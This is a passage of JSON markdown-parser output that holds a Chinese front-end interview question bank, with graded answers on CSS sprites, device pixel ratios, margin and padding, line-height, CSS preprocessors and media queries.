级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"CSSSprites（精灵图），将一个页面涉及到的所有图片都包含到一张大图中去，然后利用CSS的 background-image，background-repeat，background-position属性的组合进行背景定位。","text":"CSSSprites（精灵图），将一个页面涉及到的所有图片都包含到一张大图中去，然后利用CSS的 background-image，background-repeat，background-position属性的组合进行背景定位。","tokens":[{"type":"text","raw":"CSSSprites（精灵图），将一个页面涉及到的所有图片都包含到一张大图中去，然后利用CSS的 background-image，background-repeat，background-position属性的组合进行背景定位。","text":"CSSSprites（精灵图），将一个页面涉及到的所有图片都包含到一张大图中去，然后利用CSS的 background-image，background-repeat，background-position属性的组合进行背景定位。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"优点：","text":"优点：","tokens":[{"type":"text","raw":"优点：","text":"优点：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 减少HTTP请求数，极大地提高页面加载速度\\n\\n- 增加图片信息重复度，提高压缩比，减少图片大小\\n\\n- 减少图片的总大小","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 减少HTTP请求数，极大地提高页面加载速度\\n\\n","task":false,"loose":true,"text":"减少HTTP请求数，极大地提高页面加载速度\\n","tokens":[{"type":"text","raw":"减少HTTP请求数，极大地提高页面加载速度\\n","text":"减少HTTP请求数，极大地提高页面加载速度","tokens":[{"type":"text","raw":"减少HTTP请求数，极大地提高页面加载速度","text":"减少HTTP请求数，极大地提高页面加载速度","escaped":false}]}]},{"type":"list_item","raw":"- 增加图片信息重复度，提高压缩比，减少图片大小\\n\\n","task":false,"loose":true,"text":"增加图片信息重复度，提高压缩比，减少图片大小\\n","tokens":[{"type":"text","raw":"增加图片信息重复度，提高压缩比，减少图片大小\\n","text":"增加图片信息重复度，提高压缩比，减少图片大小","tokens":[{"type":"text","raw":"增加图片信息重复度，提高压缩比，减少图片大小","text":"增加图片信息重复度，提高压缩比，减少图片大小","escaped":false}]}]},{"type":"list_item","raw":"- 减少图片的总大小","task":false,"loose":true,"text":"减少图片的总大小","tokens":[{"type":"text","raw":"减少图片的总大小","text":"减少图片的总大小","tokens":[{"type":"text","raw":"减少图片的总大小","text":"减少图片的总大小","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"缺点：","text":"缺点：","tokens":[{"type":"text","raw":"缺点：","text":"缺点：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 图片合并麻烦\\n\\n- 维护麻烦，修改一个图片可能需要重新布局整个图片，样式调试工作量很大","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 图片合并麻烦\\n\\n","task":false,"loose":true,"text":"图片合并麻烦\\n","tokens":[{"type":"text","raw":"图片合并麻烦\\n","text":"图片合并麻烦","tokens":[{"type":"text","raw":"图片合并麻烦","text":"图片合并麻烦","escaped":false}]}]},{"type":"list_item","raw":"- 维护麻烦，修改一个图片可能需要重新布局整个图片，样式调试工作量很大","task":false,"loose":true,"text":"维护麻烦，修改一个图片可能需要重新布局整个图片，样式调试工作量很大","tokens":[{"type":"text","raw":"维护麻烦，修改一个图片可能需要重新布局整个图片，样式调试工作量很大","text":"维护麻烦，修改一个图片可能需要重新布局整个图片，样式调试工作量很大","tokens":[{"type":"text","raw":"维护麻烦，修改一个图片可能需要重新布局整个图片，样式调试工作量很大","text":"维护麻烦，修改一个图片可能需要重新布局整个图片，样式调试工作量很大","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 40. 什么是物理像素，逻辑像素和像素密度，为什么在移动端开发时需要用到@3x, @2x这种图片？\\n\\n","depth":2,"text":"40. 什么是物理像素，逻辑像素和像素密度，为什么在移动端开发时需要用到@3x, @2x这种图片？","tokens":[{"type":"text","raw":"40. 什么是物理像素，逻辑像素和像素密度，为什么在移动端开发时需要用到@3x, @2x这种图片？","text":"40. 什么是物理像素，逻辑像素和像素密度，为什么在移动端开发时需要用到@3x, @2x这种图片？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"以 iPhone XS 为例，当写 CSS 代码时，针对于单位 px，其宽度为 414px & 896px，也就是说当赋予一个 DIV元素宽度为 414px，这个 DIV 就会填满手机的宽度；","text":"以 iPhone XS 为例，当写 CSS 代码时，针对于单位 px，其宽度为 414px & 896px，也就是说当赋予一个 DIV元素宽度为 414px，这个 DIV 就会填满手机的宽度；","tokens":[{"type":"text","raw":"以 iPhone XS 为例，当写 CSS 代码时，针对于单位 px，其宽度为 414px & 896px，也就是说当赋予一个 DIV元素宽度为 414px，这个 DIV 就会填满手机的宽度；","text":"以 iPhone XS 为例，当写 CSS 代码时，针对于单位 px，其宽度为 414px & 896px，也就是说当赋予一个 DIV元素宽度为 414px，这个 DIV 就会填满手机的宽度；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"而如果有一把尺子来实际测量这部手机的物理像素，实际为 1242*2688 物理像素；经过计算可知，1242/414=3，也就是说，在单边上，一个逻辑像素=3个物理像素，就说这个屏幕的像素密度为 3，也就是常说的 3 倍屏。","text":"而如果有一把尺子来实际测量这部手机的物理像素，实际为 1242*2688 物理像素；经过计算可知，1242/414=3，也就是说，在单边上，一个逻辑像素=3个物理像素，就说这个屏幕的像素密度为 3，也就是常说的 3 倍屏。","tokens":[{"type":"text","raw":"而如果有一把尺子来实际测量这部手机的物理像素，实际为 1242*2688 物理像素；经过计算可知，1242/414=3，也就是说，在单边上，一个逻辑像素=3个物理像素，就说这个屏幕的像素密度为 3，也就是常说的 3 倍屏。","text":"而如果有一把尺子来实际测量这部手机的物理像素，实际为 1242*2688 物理像素；经过计算可知，1242/414=3，也就是说，在单边上，一个逻辑像素=3个物理像素，就说这个屏幕的像素密度为 3，也就是常说的 3 倍屏。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"对于图片来说，为了保证其不失真，1 个图片像素至少要对应一个物理像素，假如原始图片是 500300 像素，那么在 3 倍屏上就要放一个 1500900 像素的图片才能保证 1 个物理像素至少对应一个图片像素，才能不失真。","text":"对于图片来说，为了保证其不失真，1 个图片像素至少要对应一个物理像素，假如原始图片是 500300 像素，那么在 3 倍屏上就要放一个 1500900 像素的图片才能保证 1 个物理像素至少对应一个图片像素，才能不失真。","tokens":[{"type":"text","raw":"对于图片来说，为了保证其不失真，1 个图片像素至少要对应一个物理像素，假如原始图片是 500300 像素，那么在 3 倍屏上就要放一个 1500900 像素的图片才能保证 1 个物理像素至少对应一个图片像素，才能不失真。","text":"对于图片来说，为了保证其不失真，1 个图片像素至少要对应一个物理像素，假如原始图片是 500300 像素，那么在 3 倍屏上就要放一个 1500900 像素的图片才能保证 1 个物理像素至少对应一个图片像素，才能不失真。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 41. margin 和 padding 的使用场景\\n\\n","depth":2,"text":"41. margin 和 padding 的使用场景","tokens":[{"type":"text","raw":"41. margin 和 padding 的使用场景","text":"41. margin 和 padding 的使用场景","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；\\n\\n- 需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；\\n\\n","task":false,"loose":true,"text":"需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；\\n","tokens":[{"type":"text","raw":"需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；\\n","text":"需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；","tokens":[{"type":"text","raw":"需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；","text":"需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；","escaped":false}]}]},{"type":"list_item","raw":"- 需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","task":false,"loose":true,"text":"需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","tokens":[{"type":"text","raw":"需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","text":"需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","tokens":[{"type":"text","raw":"需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","text":"需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 42. 对line-height 的理解及其赋值方式\\n\\n","depth":2,"text":"42. 对line-height 的理解及其赋值方式","tokens":[{"type":"text","raw":"42. 对line-height 的理解及其赋值方式","text":"42. 对line-height 的理解及其赋值方式","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"line-height的概念：","text":"line-height的概念：","tokens":[{"type":"text","raw":"line-height的概念：","text":"line-height的概念：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- line-height 指一行文本的高度，包含了字间距，实际上是下一行基线到上一行基线距离；\\n\\n- 如果一个标签没有定义 height 属性，那么其最终表现的高度由 line-height 决定；\\n\\n- 一个容器没有设置高度，那么撑开容器高度的是 line-height，而不是容器内的文本内容；\\n\\n- 把 line-height 值设置为 height 一样大小的值可以实现单行文字的垂直居中；\\n\\n- line-height 和 height 都能撑开一个高度；","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- line-height 指一行文本的高度，包含了字间距，实际上是下一行基线到上一行基线距离；\\n\\n","task":false,"loose":true,"text":"line-height 指一行文本的高度，包含了字间距，实际上是下一行基线到上一行基线距离；\\n","tokens":[{"type":"text","raw":"line-height 指一行文本的高度，包含了字间距，实际上是下一行基线到上一行基线距离；\\n","text":"line-height 指一行文本的高度，包含了字间距，实际上是下一行基线到上一行基线距离；","tokens":[{"type":"text","raw":"line-height 指一行文本的高度，包含了字间距，实际上是下一行基线到上一行基线距离；","text":"line-height 指一行文本的高度，包含了字间距，实际上是下一行基线到上一行基线距离；","escaped":false}]}]},{"type":"list_item","raw":"- 如果一个标签没有定义 height 属性，那么其最终表现的高度由 line-height 决定；\\n\\n","task":false,"loose":true,"text":"如果一个标签没有定义 height 属性，那么其最终表现的高度由 line-height 决定；\\n","tokens":[{"type":"text","raw":"如果一个标签没有定义 height 属性，那么其最终表现的高度由 line-height 决定；\\n","text":"如果一个标签没有定义 height 属性，那么其最终表现的高度由 line-height 决定；","tokens":[{"type":"text","raw":"如果一个标签没有定义 height 属性，那么其最终表现的高度由 line-height 决定；","text":"如果一个标签没有定义 height 属性，那么其最终表现的高度由 line-height 决定；","escaped":false}]}]},{"type":"list_item","raw":"- 一个容器没有设置高度，那么撑开容器高度的是 line-height，而不是容器内的文本内容；\\n\\n","task":false,"loose":true,"text":"一个容器没有设置高度，那么撑开容器高度的是 line-height，而不是容器内的文本内容；\\n","tokens":[{"type":"text","raw":"一个容器没有设置高度，那么撑开容器高度的是 line-height，而不是容器内的文本内容；\\n","text":"一个容器没有设置高度，那么撑开容器高度的是 line-height，而不是容器内的文本内容；","tokens":[{"type":"text","raw":"一个容器没有设置高度，那么撑开容器高度的是 line-height，而不是容器内的文本内容；","text":"一个容器没有设置高度，那么撑开容器高度的是 line-height，而不是容器内的文本内容；","escaped":false}]}]},{"type":"list_item","raw":"- 把 line-height 值设置为 height 一样大小的值可以实现单行文字的垂直居中；\\n\\n","task":false,"loose":true,"text":"把 line-height 值设置为 height 一样大小的值可以实现单行文字的垂直居中；\\n","tokens":[{"type":"text","raw":"把 line-height 值设置为 height 一样大小的值可以实现单行文字的垂直居中；\\n","text":"把 line-height 值设置为 height 一样大小的值可以实现单行文字的垂直居中；","tokens":[{"type":"text","raw":"把 line-height 值设置为 height 一样大小的值可以实现单行文字的垂直居中；","text":"把 line-height 值设置为 height 一样大小的值可以实现单行文字的垂直居中；","escaped":false}]}]},{"type":"list_item","raw":"- line-height 和 height 都能撑开一个高度；","task":false,"loose":true,"text":"line-height 和 height 都能撑开一个高度；","tokens":[{"type":"text","raw":"line-height 和 height 都能撑开一个高度；","text":"line-height 和 height 都能撑开一个高度；","tokens":[{"type":"text","raw":"line-height 和 height 都能撑开一个高度；","text":"line-height 和 height 都能撑开一个高度；","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"line-height 的赋值方式：","text":"line-height 的赋值方式：","tokens":[{"type":"text","raw":"line-height 的赋值方式：","text":"line-height 的赋值方式：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 带单位：px 是固定值，而 em 会参考父元素 font-size 值计算自身的行高\\n\\n- 纯数字：会把比例传递给后代。例如，父级行高为 1.5，子元素字体为 18px，则子元素行高为 1.5 * 18 = 27px\\n\\n- 百分比：将计算后的值传递给后代","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 带单位：px 是固定值，而 em 会参考父元素 font-size 值计算自身的行高\\n\\n","task":false,"loose":true,"text":"带单位：px 是固定值，而 em 会参考父元素 font-size 值计算自身的行高\\n","tokens":[{"type":"text","raw":"带单位：px 是固定值，而 em 会参考父元素 font-size 值计算自身的行高\\n","text":"带单位：px 是固定值，而 em 会参考父元素 font-size 值计算自身的行高","tokens":[{"type":"text","raw":"带单位：px 是固定值，而 em 会参考父元素 font-size 值计算自身的行高","text":"带单位：px 是固定值，而 em 会参考父元素 font-size 值计算自身的行高","escaped":false}]}]},{"type":"list_item","raw":"- 纯数字：会把比例传递给后代。例如，父级行高为 1.5，子元素字体为 18px，则子元素行高为 1.5 * 18 = 27px\\n\\n","task":false,"loose":true,"text":"纯数字：会把比例传递给后代。例如，父级行高为 1.5，子元素字体为 18px，则子元素行高为 1.5 * 18 = 27px\\n","tokens":[{"type":"text","raw":"纯数字：会把比例传递给后代。例如，父级行高为 1.5，子元素字体为 18px，则子元素行高为 1.5 * 18 = 27px\\n","text":"纯数字：会把比例传递给后代。例如，父级行高为 1.5，子元素字体为 18px，则子元素行高为 1.5 * 18 = 27px","tokens":[{"type":"text","raw":"纯数字：会把比例传递给后代。例如，父级行高为 1.5，子元素字体为 18px，则子元素行高为 1.5 * 18 = 27px","text":"纯数字：会把比例传递给后代。例如，父级行高为 1.5，子元素字体为 18px，则子元素行高为 1.5 * 18 = 27px","escaped":false}]}]},{"type":"list_item","raw":"- 百分比：将计算后的值传递给后代","task":false,"loose":true,"text":"百分比：将计算后的值传递给后代","tokens":[{"type":"text","raw":"百分比：将计算后的值传递给后代","text":"百分比：将计算后的值传递给后代","tokens":[{"type":"text","raw":"百分比：将计算后的值传递给后代","text":"百分比：将计算后的值传递给后代","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 43. CSS预处理器/后处理器是什么？为什么要使用它们？\\n\\n","depth":2,"text":"43. CSS预处理器/后处理器是什么？为什么要使用它们？","tokens":[{"type":"text","raw":"43. CSS预处理器/后处理器是什么？为什么要使用它们？","text":"43. CSS预处理器/后处理器是什么？为什么要使用它们？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"预处理器， 如：less，sass，stylus，用来预编译sass或者less，增加了css代码的复用性。层级，mixin， 变量，循环， 函数等对编写以及开发UI组件都极为方便。","text":"预处理器， 如：less，sass，stylus，用来预编译sass或者less，增加了css代码的复用性。层级，mixin， 变量，循环， 函数等对编写以及开发UI组件都极为方便。","tokens":[{"type":"text","raw":"预处理器， 如：less，sass，stylus，用来预编译sass或者less，增加了css代码的复用性。层级，mixin， 变量，循环， 函数等对编写以及开发UI组件都极为方便。","text":"预处理器， 如：less，sass，stylus，用来预编译sass或者less，增加了css代码的复用性。层级，mixin， 变量，循环， 函数等对编写以及开发UI组件都极为方便。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"后处理器， 如： postCss，通常是在完成的样式表中根据css规范处理css，让其更加有效。目前最常做的是给css属性添加浏览器私有前缀，实现跨浏览器兼容性的问题。","text":"后处理器， 如： postCss，通常是在完成的样式表中根据css规范处理css，让其更加有效。目前最常做的是给css属性添加浏览器私有前缀，实现跨浏览器兼容性的问题。","tokens":[{"type":"text","raw":"后处理器， 如： postCss，通常是在完成的样式表中根据css规范处理css，让其更加有效。目前最常做的是给css属性添加浏览器私有前缀，实现跨浏览器兼容性的问题。","text":"后处理器， 如： postCss，通常是在完成的样式表中根据css规范处理css，让其更加有效。目前最常做的是给css属性添加浏览器私有前缀，实现跨浏览器兼容性的问题。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"css预处理器为css增加一些编程特性，无需考虑浏览器的兼容问题，可以在CSS中使用变量，简单的逻辑程序，函数等在编程语言中的一些基本的性能，可以让css更加的简洁，增加适应性以及可读性，可维护性等。","text":"css预处理器为css增加一些编程特性，无需考虑浏览器的兼容问题，可以在CSS中使用变量，简单的逻辑程序，函数等在编程语言中的一些基本的性能，可以让css更加的简洁，增加适应性以及可读性，可维护性等。","tokens":[{"type":"text","raw":"css预处理器为css增加一些编程特性，无需考虑浏览器的兼容问题，可以在CSS中使用变量，简单的逻辑程序，函数等在编程语言中的一些基本的性能，可以让css更加的简洁，增加适应性以及可读性，可维护性等。","text":"css预处理器为css增加一些编程特性，无需考虑浏览器的兼容问题，可以在CSS中使用变量，简单的逻辑程序，函数等在编程语言中的一些基本的性能，可以让css更加的简洁，增加适应性以及可读性，可维护性等。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"使用原因：","text":"使用原因：","tokens":[{"type":"text","raw":"使用原因：","text":"使用原因：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"结构清晰， 便于扩展","text":"结构清晰， 便于扩展","tokens":[{"type":"text","raw":"结构清晰， 便于扩展","text":"结构清晰， 便于扩展","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"可以很方便的屏蔽浏览器私有语法的差异","text":"可以很方便的屏蔽浏览器私有语法的差异","tokens":[{"type":"text","raw":"可以很方便的屏蔽浏览器私有语法的差异","text":"可以很方便的屏蔽浏览器私有语法的差异","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"可以轻松实现多重继承","text":"可以轻松实现多重继承","tokens":[{"type":"text","raw":"可以轻松实现多重继承","text":"可以轻松实现多重继承","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"完美的兼容了CSS代码，可以应用到老项目中","text":"完美的兼容了CSS代码，可以应用到老项目中","tokens":[{"type":"text","raw":"完美的兼容了CSS代码，可以应用到老项目中","text":"完美的兼容了CSS代码，可以应用到老项目中","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 44. 对媒体查询的理解？\\n\\n","depth":2,"text":"44. 对媒体查询的理解？","tokens":[{"type":"text","raw":"44. 对媒体查询的理解？","text":"44. 对媒体查询的理解？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"媒体查询由⼀个可选的媒体类型和零个或多个使⽤媒体功能的限制了样式表范围的表达式组成，例如宽度、⾼度和颜⾊。媒体查询，添加⾃CSS3，允许内容的呈现针对⼀个特定范围的输出设备⽽进⾏裁剪，⽽不必改变内容本身，适合web⽹⻚应对不同型号的设备⽽做出对应的响应适配。","text":"媒体查询由⼀个可选的媒体类型和零个或多个使⽤媒体功能的限制了样式表范围的表达式组成，例如宽度、⾼度和颜⾊。媒体查询，添加⾃CSS3，允许内容的呈现针对⼀个特定范围的输出设备⽽进⾏裁剪，⽽不必改变内容本身，适合web⽹⻚应对不同型号的设备⽽做出对应的响应适配。","tokens":[{"type":"text","raw":"媒体查询由⼀个可选的媒体类型和零个或多个使⽤媒体功能的限制了样式表范围的表达式组成，例如宽度、⾼度和颜⾊。媒体查询，添加⾃CSS3，允许内容的呈现针对⼀个特定范围的输出设备⽽进⾏裁剪，⽽不必改变内容本身，适合web⽹⻚应对不同型号的设备⽽做出对应的响应适配。","text":"媒体查询由⼀个可选的媒体类型和零个或多个使⽤媒体功能的限制了样式表范围的表达式组成，例如宽度、⾼度和颜⾊。媒体查询，添加⾃CSS3，允许内容的呈现针对⼀个特定范围的输出设备⽽进⾏裁剪，⽽不必改变内容本身，适合web⽹⻚应对不同型号的设备⽽做出对应的响应适配。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"媒体查询包含⼀个可选的媒体类型和满⾜CSS3规范的条件下，包含零个或多个表达式，这些表达式描述了媒体特征，最终会被解析为true或false。如果媒体查询中指定的媒体类型匹配展示⽂档所使⽤的设备类型，并且所有的表达式的值都是true，那么该媒体查询的结果为true。那么媒体查询内的样式将会⽣效。","text":"媒体查询包含⼀个可选的媒体类型和满⾜CSS3规范的条件下，包含零个或多个表达式，这些表达式描述了媒体特征，最终会被解析为true或false。如果媒体查询中指定的媒体类型匹配展示⽂档所使⽤的设备类型，并且所有的表达式的值都是true，那么该媒体查询的结果为true。那么媒体查询内的样式将会⽣效。","tokens":[{"type":"text","raw":"媒体查询包含⼀个可选的媒体类型和满⾜CSS3规范的条件下，包含零个或多个表达式，这些表达式描述了媒体特征，最终会被解析为true或false。如果媒体查询中指定的媒体类型匹配展示⽂档所使⽤的设备类型，并且所有的表达式的值都是true，那么该媒体查询的结果为true。那么媒体查询内的样式将会⽣效。","text":"媒体查询包含⼀个可选的媒体类型和满⾜CSS3规范的条件下，包含零个或多个表达式，这些表达式描述了媒体特征，最终会被解析为true或false。如果媒体查询中指定的媒体类型匹配展示⽂档所使⽤的设备类型，并且所有的表达式的值都是true，那么该媒体查询的结果为true。那么媒体查询内的样式将会⽣效。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```html\\n<!-- link元素中的CSS媒体查询 --> \\n<link rel=\\"stylesheet\\" media=\\"(max-width: 800px)\\" href=\\"example.css\\" /> \\n<!-- 样式表中的CSS媒体查询 --> \\n<style> \\n@media (max-width: 600px) { \\n  .facet_sidebar { \\n    display: none; \\n  } \\n}\\n</style>\\n\\n```","lang":"html","text":"<!-- link元素中的CSS媒体查询 --> \\n<link rel=\\"stylesheet\\" media=\\"(max-width: 800px)\\" href=\\"example.css\\" /> \\n<!-- 样式表中的CSS媒体查询 --> \\n<style> \\n@media (max-width: 600px) { \\n  .facet_sidebar { \\n    display: none; \\n  } \\n}\\n</style>\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 45. 对 CSS 工程化的理解\\n\\n","depth":2,"text":"45. 对 CSS 工程化的理解","tokens":[{"type":"text","raw":"45. 对 CSS 工程化的理解","text":"45. 对 CSS 工程化的理解","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 